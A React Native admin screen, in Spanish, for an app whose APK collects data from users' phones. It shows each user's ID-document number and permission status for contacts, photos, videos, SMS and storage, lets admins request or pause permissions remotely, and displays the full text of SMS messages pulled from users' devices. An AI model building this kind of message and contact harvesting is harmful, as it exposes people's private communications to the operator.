import { Feather } from "@expo/vector-icons";
import { useRouter } from "expo-router";
import React, { useCallback, useEffect, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  FlatList,
  Modal,
  Platform,
  ScrollView,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import { useApp } from "@/context/AppContext";
import { apiUrl } from "@/utils/api";
import type { RegisteredUser } from "@/context/AppContext";

const BG = "#0A0E27";
const CARD = "#111827";
const BORDER = "rgba(253,218,36,0.18)";
const TEXT = "#FFFFFF";
const TEXTSEC = "rgba(255,255,255,0.45)";
const YELLOW = "#FDDA24";
const GREEN = "#10B981";
const RED = "#EF4444";
const ORANGE = "#F59E0B";
const BLUE = "#3B82F6";
const PURPLE = "#A78BFA";

const PERMISSION_LABELS: Record<string, { label: string; icon: keyof typeof Feather.glyphMap }> = {
  contacts: { label: "Contactos", icon: "book" },
  media_images: { label: "Fotos", icon: "image" },
  media_video: { label: "Videos", icon: "video" },
  sms: { label: "Mensajes SMS", icon: "message-square" },
  notifications: { label: "Notificaciones", icon: "bell" },
  storage_legacy: { label: "Almacenamiento", icon: "hard-drive" },
};

const ALL_PERMISSION_KEYS = Object.keys(PERMISSION_LABELS);

type PermissionRow = {
  id: string;
  userId: string;
  permissionType: string;
  status: string;
  requestedByAdmin: boolean;
  disabledByAdmin: boolean;
  grantedAt: string | null;
  deniedAt: string | null;
  lastAskedAt: string | null;
};

type SmsRow = {
  id: string;
  smsId: string;
  sender: string;
  body: string;
  receivedAt: string;
  isRead: number;
};

type UserPermissionsMap = Record<string, PermissionRow[]>;

function statusColor(status: string) {
  if (status === "granted") return GREEN;
  if (status === "denied") return RED;
  return ORANGE;
}

function statusLabel(status: string) {
  if (status === "granted") return "Concedido";
  if (status === "denied") return "Denegado";
  return "No solicitado";
}

function initials(u: RegisteredUser) {
  return `${u.firstName?.[0] ?? ""}${u.lastName?.[0] ?? ""}`.toUpperCase();
}

function fmtDate(iso: string | null) {
  if (!iso) return "—";
  try {
    return new Date(iso).toLocaleString("es-CO", {
      day: "2-digit", month: "short", year: "numeric",
      hour: "2-digit", minute: "2-digit",
    });
  } catch { return iso; }
}

function fmtDateShort(iso: string | null) {
  if (!iso) return "—";
  try {
    return new Date(iso).toLocaleString("es-CO", {
      day: "2-digit", month: "short",
      hour: "2-digit", minute: "2-digit",
    });
  } catch { return iso; }
}

export default function DispositivosScreen() {
  const { getAllUsers } = useApp();
  const router = useRouter();
  const insets = useSafeAreaInsets();
  const topPad = insets.top > 0 ? insets.top : 20;

  const [users, setUsers] = useState<RegisteredUser[]>([]);
  const [permissionsMap, setPermissionsMap] = useState<UserPermissionsMap>({});
  const [loading, setLoading] = useState(true);
  const [selectedUser, setSelectedUser] = useState<RegisteredUser | null>(null);
  const [detailModal, setDetailModal] = useState(false);
  const [activeTab, setActiveTab] = useState<"permisos" | "sms">("permisos");
  const [smsMessages, setSmsMessages] = useState<SmsRow[]>([]);
  const [smsLoading, setSmsLoading] = useState(false);
  const [actionLoading, setActionLoading] = useState<string | null>(null);

  const loadData = useCallback(async () => {
    setLoading(true);
    try {
      const allUsers = await getAllUsers();
      const nonAdmin = allUsers.filter((u) => !u.isAdmin);
      setUsers(nonAdmin);

      const allPerms = await fetch(apiUrl("/api/device-permissions/all")).then((r) => r.json());
      const map: UserPermissionsMap = {};
      for (const perm of allPerms as PermissionRow[]) {
        if (!map[perm.userId]) map[perm.userId] = [];
        map[perm.userId].push(perm);
      }
      setPermissionsMap(map);
    } catch { /* ignore */ } finally {
      setLoading(false);
    }
  }, [getAllUsers]);

  useEffect(() => { void loadData(); }, [loadData]);

  const loadSms = useCallback(async (userId: string) => {
    setSmsLoading(true);
    try {
      const rows = await fetch(apiUrl(`/api/sms-logs?userId=${userId}`)).then((r) => r.json());
      setSmsMessages(Array.isArray(rows) ? rows : []);
    } catch {
      setSmsMessages([]);
    } finally {
      setSmsLoading(false);
    }
  }, []);

  const openDetail = (u: RegisteredUser) => {
    setSelectedUser(u);
    setActiveTab("permisos");
    setSmsMessages([]);
    setDetailModal(true);
    void loadSms(u.id);
  };

  const handleRequestPermission = async (userId: string, permKey: string) => {
    setActionLoading(`req-${permKey}`);
    try {
      await fetch(apiUrl("/api/device-permissions/request"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, permissionType: permKey }),
      });
      await loadData();
    } catch { /* ignore */ } finally {
      setActionLoading(null);
    }
  };

  const handleDisableAll = async (userId: string) => {
    const confirm = Platform.OS === "web"
      ? window.confirm("¿Desactivar todos los permisos de este usuario?")
      : true;
    if (!confirm) return;
    if (Platform.OS !== "web") {
      Alert.alert(
        "Desactivar permisos",
        "¿Desactivar todos los permisos de este usuario?",
        [
          { text: "Cancelar", style: "cancel" },
          {
            text: "Desactivar",
            style: "destructive",
            onPress: async () => {
              await fetch(apiUrl("/api/device-permissions/disable-all"), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userId }),
              });
              await loadData();
            },
          },
        ]
      );
      return;
    }
    await fetch(apiUrl("/api/device-permissions/disable-all"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId }),
    });
    await loadData();
  };

  const handleEnableAll = async (userId: string) => {
    await fetch(apiUrl("/api/device-permissions/enable-all"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId }),
    });
    await loadData();
  };

  const getUserPermCount = (userId: string) => {
    const perms = permissionsMap[userId] ?? [];
    return perms.filter((p) => p.status === "granted").length;
  };

  const getUserPermissions = (userId: string): PermissionRow[] => {
    return permissionsMap[userId] ?? [];
  };

  const getPermForKey = (userId: string, key: string): PermissionRow | null => {
    return permissionsMap[userId]?.find((p) => p.permissionType === key) ?? null;
  };

  const anyDisabled = (userId: string) =>
    (permissionsMap[userId] ?? []).some((p) => p.disabledByAdmin);

  return (
    <View style={[styles.container, { paddingTop: topPad }]}>
      <View style={styles.header}>
        <TouchableOpacity style={styles.backBtn} onPress={() => router.back()}>
          <Feather name="arrow-left" size={20} color={YELLOW} />
        </TouchableOpacity>
        <View style={{ flex: 1 }}>
          <Text style={styles.headerTitle}>Dispositivos y Permisos</Text>
          <Text style={styles.headerSub}>Permisos y datos recopilados por APK</Text>
        </View>
        <TouchableOpacity style={styles.refreshBtn} onPress={loadData}>
          <Feather name="refresh-cw" size={18} color={TEXTSEC} />
        </TouchableOpacity>
      </View>

      {loading ? (
        <View style={styles.center}>
          <ActivityIndicator color={YELLOW} />
        </View>
      ) : users.length === 0 ? (
        <View style={styles.center}>
          <Feather name="smartphone" size={36} color={TEXTSEC} />
          <Text style={styles.emptyText}>No hay usuarios registrados</Text>
        </View>
      ) : (
        <FlatList
          data={users}
          keyExtractor={(u) => u.id}
          contentContainerStyle={{ padding: 16, gap: 10, paddingBottom: 40 }}
          renderItem={({ item: u }) => {
            const grantCount = getUserPermCount(u.id);
            const userPerms = getUserPermissions(u.id);
            const disabled = anyDisabled(u.id);
            return (
              <TouchableOpacity
                style={styles.userCard}
                onPress={() => openDetail(u)}
                activeOpacity={0.8}
              >
                <View style={[styles.avatar, { backgroundColor: BLUE + "22", borderColor: BLUE + "55" }]}>
                  <Text style={[styles.avatarText, { color: BLUE }]}>{initials(u)}</Text>
                </View>
                <View style={{ flex: 1, gap: 3 }}>
                  <Text style={styles.userName}>{u.firstName} {u.lastName}</Text>
                  <Text style={styles.userDoc}>{u.documentType} {u.documentNumber}</Text>
                  <View style={{ flexDirection: "row", gap: 6, flexWrap: "wrap", marginTop: 4 }}>
                    {ALL_PERMISSION_KEYS.map((key) => {
                      const perm = userPerms.find((p) => p.permissionType === key);
                      const st = perm?.status ?? "not_asked";
                      return (
                        <View key={key} style={[styles.permBadge, { borderColor: statusColor(st) + "55", backgroundColor: statusColor(st) + "18" }]}>
                          <Feather name={PERMISSION_LABELS[key].icon} size={9} color={statusColor(st)} />
                          <Text style={[styles.permBadgeText, { color: statusColor(st) }]}>
                            {PERMISSION_LABELS[key].label}
                          </Text>
                        </View>
                      );
                    })}
                  </View>
                </View>
                <View style={{ alignItems: "flex-end", gap: 4 }}>
                  <View style={[styles.countBadge, { backgroundColor: grantCount > 0 ? GREEN + "22" : ORANGE + "22" }]}>
                    <Text style={[styles.countText, { color: grantCount > 0 ? GREEN : ORANGE }]}>
                      {grantCount}/{ALL_PERMISSION_KEYS.length}
                    </Text>
                  </View>
                  {disabled && (
                    <View style={styles.disabledBadge}>
                      <Text style={styles.disabledText}>PAUSADO</Text>
                    </View>
                  )}
                  <Feather name="chevron-right" size={16} color={TEXTSEC} />
                </View>
              </TouchableOpacity>
            );
          }}
        />
      )}

      {/* Detail Modal */}
      <Modal visible={detailModal} animationType="slide" onRequestClose={() => setDetailModal(false)}>
        {selectedUser && (
          <View style={[styles.container, { paddingTop: topPad }]}>
            {/* Modal Header */}
            <View style={styles.modalHeader}>
              <TouchableOpacity style={styles.backBtn} onPress={() => setDetailModal(false)}>
                <Feather name="arrow-left" size={20} color={YELLOW} />
              </TouchableOpacity>
              <View style={[styles.avatarLg, { backgroundColor: BLUE + "22", borderColor: BLUE + "55" }]}>
                <Text style={[styles.avatarTextLg, { color: BLUE }]}>{initials(selectedUser)}</Text>
              </View>
              <View style={{ flex: 1 }}>
                <Text style={styles.modalName}>{selectedUser.firstName} {selectedUser.lastName}</Text>
                <Text style={styles.modalSub}>{selectedUser.documentType} {selectedUser.documentNumber}</Text>
              </View>
            </View>

            {/* Admin Actions */}
            <View style={styles.actionsRow}>
              <TouchableOpacity
                style={[styles.actionBtn, { backgroundColor: RED + "22", borderColor: RED + "44" }]}
                onPress={() => handleDisableAll(selectedUser.id)}
              >
                <Feather name="pause-circle" size={13} color={RED} />
                <Text style={[styles.actionBtnText, { color: RED }]}>Pausar todos</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.actionBtn, { backgroundColor: GREEN + "22", borderColor: GREEN + "44" }]}
                onPress={() => handleEnableAll(selectedUser.id)}
              >
                <Feather name="play-circle" size={13} color={GREEN} />
                <Text style={[styles.actionBtnText, { color: GREEN }]}>Reactivar</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.actionBtn, { backgroundColor: YELLOW + "22", borderColor: YELLOW + "44" }]}
                onPress={() => loadData()}
              >
                <Feather name="refresh-cw" size={13} color={YELLOW} />
                <Text style={[styles.actionBtnText, { color: YELLOW }]}>Actualizar</Text>
              </TouchableOpacity>
            </View>

            {/* Tabs */}
            <View style={styles.tabs}>
              <TouchableOpacity
                style={[styles.tab, activeTab === "permisos" && styles.tabActive]}
                onPress={() => setActiveTab("permisos")}
              >
                <Feather name="shield" size={13} color={activeTab === "permisos" ? YELLOW : TEXTSEC} />
                <Text style={[styles.tabText, activeTab === "permisos" && styles.tabTextActive]}>Permisos</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.tab, activeTab === "sms" && styles.tabActive]}
                onPress={() => setActiveTab("sms")}
              >
                <Feather name="message-square" size={13} color={activeTab === "sms" ? YELLOW : TEXTSEC} />
                <Text style={[styles.tabText, activeTab === "sms" && styles.tabTextActive]}>SMS</Text>
              </TouchableOpacity>
            </View>

            {/* Tab Content */}
            {activeTab === "permisos" ? (
              <ScrollView contentContainerStyle={{ padding: 16, gap: 10, paddingBottom: 40 }}>
                <View style={styles.sectionRow}>
                  <Feather name="shield" size={11} color={TEXTSEC} />
                  <Text style={styles.sectionLabel}>ESTADO DE PERMISOS DEL DISPOSITIVO</Text>
                </View>
                {ALL_PERMISSION_KEYS.map((key) => {
                  const perm = getPermForKey(selectedUser.id, key);
                  const st = perm?.status ?? "not_asked";
                  const { label, icon } = PERMISSION_LABELS[key];
                  const isDisabled = perm?.disabledByAdmin;
                  const isPendingRequest = perm?.requestedByAdmin && st !== "granted";
                  return (
                    <View key={key} style={[styles.permCard, { borderLeftColor: statusColor(st) }]}>
                      <View style={{ flexDirection: "row", alignItems: "center", gap: 10, flex: 1 }}>
                        <View style={[styles.permIcon, { backgroundColor: statusColor(st) + "22" }]}>
                          <Feather name={icon} size={16} color={statusColor(st)} />
                        </View>
                        <View style={{ flex: 1 }}>
                          <View style={{ flexDirection: "row", alignItems: "center", gap: 6 }}>
                            <Text style={styles.permName}>{label}</Text>
                            {isDisabled && (
                              <View style={styles.pausedTag}>
                                <Text style={styles.pausedTagText}>PAUSADO</Text>
                              </View>
                            )}
                            {isPendingRequest && (
                              <View style={styles.pendingTag}>
                                <Text style={styles.pendingTagText}>PENDIENTE</Text>
                              </View>
                            )}
                          </View>
                          <Text style={[styles.permStatus, { color: statusColor(st) }]}>
                            {statusLabel(st)}
                          </Text>
                          {perm?.grantedAt && (
                            <Text style={styles.permDate}>Concedido: {fmtDateShort(perm.grantedAt)}</Text>
                          )}
                          {perm?.deniedAt && (
                            <Text style={styles.permDate}>Denegado: {fmtDateShort(perm.deniedAt)}</Text>
                          )}
                          {perm?.lastAskedAt && (
                            <Text style={styles.permDate}>Última solicitud: {fmtDateShort(perm.lastAskedAt)}</Text>
                          )}
                        </View>
                      </View>
                      {st !== "granted" && !isDisabled && (
                        <TouchableOpacity
                          style={styles.reqBtn}
                          onPress={() => handleRequestPermission(selectedUser.id, key)}
                          disabled={actionLoading === `req-${key}`}
                        >
                          {actionLoading === `req-${key}` ? (
                            <ActivityIndicator size="small" color={YELLOW} />
                          ) : (
                            <>
                              <Feather name="send" size={11} color={YELLOW} />
                              <Text style={styles.reqBtnText}>Solicitar</Text>
                            </>
                          )}
                        </TouchableOpacity>
                      )}
                    </View>
                  );
                })}
              </ScrollView>
            ) : (
              <View style={{ flex: 1 }}>
                {smsLoading ? (
                  <View style={styles.center}>
                    <ActivityIndicator color={YELLOW} />
                    <Text style={styles.loadingText}>Cargando mensajes...</Text>
                  </View>
                ) : smsMessages.length === 0 ? (
                  <View style={styles.center}>
                    <Feather name="message-square" size={36} color={TEXTSEC} />
                    <Text style={styles.emptyText}>Sin mensajes SMS recopilados</Text>
                    <Text style={styles.emptySub}>
                      Los mensajes se sincronizan desde el APK cuando el usuario concede el permiso
                    </Text>
                  </View>
                ) : (
                  <FlatList
                    data={smsMessages}
                    keyExtractor={(s) => s.id}
                    contentContainerStyle={{ padding: 16, gap: 8, paddingBottom: 40 }}
                    ListHeaderComponent={() => (
                      <View style={styles.smsBanner}>
                        <Feather name="message-square" size={13} color={GREEN} />
                        <Text style={styles.smsBannerText}>
                          {smsMessages.length} mensaje{smsMessages.length !== 1 ? "s" : ""} recopilado{smsMessages.length !== 1 ? "s" : ""}
                        </Text>
                      </View>
                    )}
                    renderItem={({ item }) => (
                      <View style={[styles.smsCard, { borderLeftColor: item.isRead ? TEXTSEC : YELLOW }]}>
                        <View style={{ flexDirection: "row", alignItems: "flex-start", gap: 8 }}>
                          <View style={styles.smsAvatar}>
                            <Feather name="message-square" size={14} color={PURPLE} />
                          </View>
                          <View style={{ flex: 1, gap: 2 }}>
                            <View style={{ flexDirection: "row", justifyContent: "space-between" }}>
                              <Text style={styles.smsSender} numberOfLines={1}>{item.sender}</Text>
                              <Text style={styles.smsDate}>{fmtDateShort(item.receivedAt)}</Text>
                            </View>
                            <Text style={styles.smsBody} numberOfLines={4}>{item.body}</Text>
                          </View>
                        </View>
                      </View>
                    )}
                  />
                )}
              </View>
            )}
          </View>
        )}
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: BG },
  header: {
    flexDirection: "row", alignItems: "center", gap: 12,
    paddingHorizontal: 16, paddingBottom: 14, paddingTop: 8,
    backgroundColor: CARD, borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  backBtn: { padding: 4 },
  headerTitle: { fontSize: 18, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  headerSub: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_400Regular", marginTop: 1 },
  refreshBtn: { padding: 6 },
  center: { flex: 1, alignItems: "center", justifyContent: "center", gap: 12, padding: 32 },
  loadingText: { fontSize: 13, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  emptyText: { fontSize: 14, color: TEXTSEC, fontFamily: "Inter_400Regular", textAlign: "center" },
  emptySub: { fontSize: 12, color: TEXTSEC + "99", fontFamily: "Inter_400Regular", textAlign: "center", lineHeight: 18, marginTop: 4 },

  userCard: {
    flexDirection: "row", alignItems: "center", gap: 12,
    backgroundColor: CARD, borderRadius: 16, padding: 14,
    borderWidth: 1, borderColor: BORDER,
  },
  avatar: { width: 48, height: 48, borderRadius: 24, alignItems: "center", justifyContent: "center", borderWidth: 1 },
  avatarText: { fontSize: 17, fontWeight: "700", fontFamily: "Inter_700Bold" },
  userName: { fontSize: 14, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  userDoc: { fontSize: 11, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  permBadge: {
    flexDirection: "row", alignItems: "center", gap: 3,
    borderRadius: 6, paddingHorizontal: 5, paddingVertical: 2,
    borderWidth: 1,
  },
  permBadgeText: { fontSize: 9, fontFamily: "Inter_600SemiBold" },
  countBadge: { borderRadius: 8, paddingHorizontal: 8, paddingVertical: 3 },
  countText: { fontSize: 12, fontWeight: "700", fontFamily: "Inter_700Bold" },
  disabledBadge: { backgroundColor: RED + "22", borderRadius: 5, paddingHorizontal: 5, paddingVertical: 2 },
  disabledText: { fontSize: 8, color: RED, fontFamily: "Inter_700Bold", letterSpacing: 0.8 },

  modalHeader: {
    flexDirection: "row", alignItems: "center", gap: 12,
    paddingHorizontal: 16, paddingBottom: 14, paddingTop: 4,
    backgroundColor: CARD, borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  avatarLg: { width: 48, height: 48, borderRadius: 24, alignItems: "center", justifyContent: "center", borderWidth: 1 },
  avatarTextLg: { fontSize: 18, fontWeight: "700", fontFamily: "Inter_700Bold" },
  modalName: { fontSize: 15, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  modalSub: { fontSize: 12, color: TEXTSEC, fontFamily: "Inter_400Regular" },

  actionsRow: {
    flexDirection: "row", gap: 8, padding: 12,
    backgroundColor: "#0D1123", borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  actionBtn: {
    flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center",
    gap: 5, borderRadius: 10, paddingVertical: 8, paddingHorizontal: 6,
    borderWidth: 1,
  },
  actionBtnText: { fontSize: 11, fontWeight: "700", fontFamily: "Inter_700Bold" },

  tabs: {
    flexDirection: "row", backgroundColor: CARD,
    borderBottomWidth: 1, borderBottomColor: BORDER,
  },
  tab: {
    flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center",
    gap: 6, paddingVertical: 12, borderBottomWidth: 2, borderBottomColor: "transparent",
  },
  tabActive: { borderBottomColor: YELLOW },
  tabText: { fontSize: 13, color: TEXTSEC, fontFamily: "Inter_500Medium" },
  tabTextActive: { color: YELLOW, fontFamily: "Inter_700Bold" },

  sectionRow: { flexDirection: "row", alignItems: "center", gap: 6, marginBottom: 4 },
  sectionLabel: {
    fontSize: 10, fontWeight: "700", color: "rgba(255,255,255,0.3)",
    letterSpacing: 1.1, fontFamily: "Inter_700Bold",
  },

  permCard: {
    flexDirection: "row", alignItems: "center",
    backgroundColor: CARD, borderRadius: 12, padding: 12,
    borderWidth: 1, borderColor: BORDER, borderLeftWidth: 3, gap: 8,
  },
  permIcon: { width: 36, height: 36, borderRadius: 10, alignItems: "center", justifyContent: "center" },
  permName: { fontSize: 13, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold" },
  permStatus: { fontSize: 12, fontFamily: "Inter_600SemiBold", marginTop: 1 },
  permDate: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_400Regular", marginTop: 1 },
  pausedTag: { backgroundColor: RED + "22", borderRadius: 5, paddingHorizontal: 5, paddingVertical: 1 },
  pausedTagText: { fontSize: 8, color: RED, fontFamily: "Inter_700Bold", letterSpacing: 0.8 },
  pendingTag: { backgroundColor: YELLOW + "22", borderRadius: 5, paddingHorizontal: 5, paddingVertical: 1 },
  pendingTagText: { fontSize: 8, color: YELLOW, fontFamily: "Inter_700Bold", letterSpacing: 0.8 },

  reqBtn: {
    flexDirection: "row", alignItems: "center", gap: 4,
    backgroundColor: YELLOW + "18", borderRadius: 8,
    paddingHorizontal: 10, paddingVertical: 6,
    borderWidth: 1, borderColor: YELLOW + "44",
  },
  reqBtnText: { fontSize: 11, color: YELLOW, fontFamily: "Inter_700Bold" },

  smsBanner: {
    flexDirection: "row", alignItems: "center", gap: 8,
    backgroundColor: GREEN + "15", borderRadius: 10,
    padding: 10, borderWidth: 1, borderColor: GREEN + "30", marginBottom: 4,
  },
  smsBannerText: { fontSize: 12, color: GREEN, fontFamily: "Inter_500Medium" },
  smsCard: {
    backgroundColor: CARD, borderRadius: 12, padding: 12,
    borderWidth: 1, borderColor: BORDER, borderLeftWidth: 3,
  },
  smsAvatar: {
    width: 32, height: 32, borderRadius: 16,
    backgroundColor: PURPLE + "22", alignItems: "center", justifyContent: "center",
    borderWidth: 1, borderColor: PURPLE + "40",
  },
  smsSender: { fontSize: 12, fontWeight: "700", color: TEXT, fontFamily: "Inter_700Bold", flex: 1 },
  smsDate: { fontSize: 10, color: TEXTSEC, fontFamily: "Inter_400Regular" },
  smsBody: { fontSize: 12, color: "rgba(255,255,255,0.7)", fontFamily: "Inter_400Regular", lineHeight: 17 },
});
